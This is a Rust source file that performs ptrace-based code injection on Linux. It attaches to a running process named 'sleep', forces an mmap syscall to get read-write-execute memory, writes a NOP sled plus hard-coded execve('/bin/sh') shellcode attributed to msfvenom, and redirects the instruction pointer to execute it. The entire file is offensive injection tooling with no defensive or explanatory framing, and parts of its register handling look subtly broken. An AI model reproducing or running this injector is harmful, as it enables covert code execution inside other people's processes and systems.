use sysinfo::System;
use libc::{pid_t, ptrace, sysconf, user_regs_struct, waitpid, PTRACE_ATTACH, PTRACE_DETACH, PTRACE_GETREGS, PTRACE_POKEDATA, PTRACE_POKETEXT, PTRACE_SETREGS, PTRACE_SINGLESTEP, _SC_PAGESIZE};
use std::io;


fn get_process_id_by_name(name: &str) -> Option<i32> {
    let mut system = System::new_all();
    system.refresh_all();
    for (_, process) in system.processes() {
        if process.name() == name {
            return Some(process.pid().as_u32() as i32);
        }
    }
    None
}

fn allocate_remote_memory(target_pid: pid_t, size: usize) -> Result<u64, io::Error> {
    unsafe {
        // Get the current registers
        let mut regs: user_regs_struct = std::mem::zeroed();
        ptrace(PTRACE_GETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &mut regs);

        // Store a backup of the original registers
        let original_regs = regs;

        // Align memory size to the page size
        let page_size = sysconf(_SC_PAGESIZE) as usize;
        let aligned_size = (((size + page_size - 1) / page_size) * page_size) as u64;
 
        // Set up the syscall arguments for mmap
        regs.rax = libc::SYS_mmap as u64;  // mmap syscall number
        regs.rdi = 0;  // Set aligned memory address manually
        regs.rsi = aligned_size;  // Page-aligned size
        regs.rdx = (libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as u64;  // RWX permissions
        regs.r10 = (libc::MAP_ANONYMOUS | libc::MAP_PRIVATE) as u64;  // Flags
        regs.r8 = u64::MAX;  // Correct file descriptor casting
        regs.r9 = 0;  // Offset

        // Set the registers with the new syscall arguments
        ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &regs);

        // Execute the syscall using the SYSCALL instruction (0x050f)
        ptrace(PTRACE_POKETEXT, target_pid, regs.rip as *mut libc::c_void, 0x050f); // syscall instruction
        ptrace(PTRACE_SINGLESTEP, target_pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
        waitpid(target_pid, std::ptr::null_mut(), 0);

        // Read the syscall result (allocated address)
        ptrace(PTRACE_GETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &mut regs);

        let allocated_address = regs.rax;

        if allocated_address == 0 || allocated_address == u64::MAX {
            println!("Error allocating memory: 0x{:x}", allocated_address);
            println!("Error: {}", io::Error::last_os_error());
            return Err(io::Error::new(io::ErrorKind::Other, "Invalid memory address allocated"));
        }

        if (allocated_address as i64) < 0{
            return Err(io::Error::last_os_error());
        }

        // Restore original registers
        ptrace(PTRACE_POKETEXT, target_pid, regs.rip as *mut libc::c_void, original_regs.rip as *mut libc::c_void);
        if ptrace(PTRACE_SETREGS, target_pid, std::ptr::null_mut::<libc::c_void>(), &original_regs) == -1 {
            return Err(io::Error::last_os_error());
        }

        Ok(allocated_address)
    }
}

fn write_shellcode(pid: pid_t, mut address: u64, shellcode: &[u8]) -> Result<(), std::io::Error> {
    println!("Writing shellcode to address: 0x{:x} in process id {}", address, pid);
    let mut padded_shellcode = shellcode.to_vec();
    while padded_shellcode.len() % 8 != 0 {
        padded_shellcode.push(0x90); // NOP sled padding
    }
    unsafe {
        let mut data = [0u8; 8];

        for (_, chunk) in padded_shellcode.chunks(8).enumerate() {
            for (j, &byte) in chunk.iter().enumerate() {
                data[j] = byte;
            }

            let word = u64::from_le_bytes(data);
            if ptrace(PTRACE_POKEDATA, pid, address as *mut libc::c_void, word as *mut libc::c_void) == -1 {
                return Err(std::io::Error::last_os_error());
            }

            address += 8;
        }
    }


    Ok(())
}

fn execute_shellcode_at_address(address: u64, pid: pid_t) -> Result<(), std::io::Error> {
    unsafe {
        let mut regs: user_regs_struct = std::mem::zeroed();
        ptrace(PTRACE_GETREGS, pid, std::ptr::null_mut::<libc::c_void>(), &regs);
        ptrace(PTRACE_POKETEXT, pid, regs.rax as *mut libc::c_void, address - 2); 
        regs.rip = address + 8 + 2; // +2 to skip the SYSCALL instruction
        println!("Setting RIP to 0x{:x}", regs.rip);
        ptrace(PTRACE_SETREGS, pid, std::ptr::null_mut::<libc::c_void>(), &regs);
    }
    Ok(())
}
fn main() {
    let process_name = "sleep";

    // msfvenom -p linux/x64/exec -f rust
    let shellcode: [u8; 21] = [
        0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,
        0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52,0x5e,0x6a,0x3b,0x58,
        0x0f,0x05
    ];

    let mut payload = vec![];
    payload.append([0x90, 0x90, 0x90, 0x90, 0x90, 0x90].to_vec().as_mut());
    payload.append(&mut shellcode.to_vec());

    match get_process_id_by_name(process_name) {
        Some(pid) => {
            println!("Process {} has PID: {}", process_name, pid);
            unsafe { 
                ptrace(PTRACE_ATTACH, pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());
                waitpid(pid, std::ptr::null_mut(), 0);
            };
            match allocate_remote_memory(pid, payload.len()) {
                Ok(address) => {
                    println!("Allocated memory at address: 0x{:x}", address);
                    match write_shellcode(pid, address + 8, &payload) {
                        Ok(_) => {
                            println!("{} bytes written successfully", payload.len());
                            match execute_shellcode_at_address(address, pid) {
                                Ok(_) => println!("Shellcode executed"),
                                Err(e) => println!("Error executing shellcode: {}", e),
                            }
                        },
                        Err(e) => println!("Error writing shellcode: {}", e),
                    }
                    unsafe { ptrace(PTRACE_DETACH, pid, std::ptr::null_mut::<libc::c_void>(), std::ptr::null_mut::<libc::c_void>());}

                },
                Err(e) => println!("Error allocating memory: {}", e),
            }
        } 
        None => println!("Process {} not found", process_name),
    }
    
}
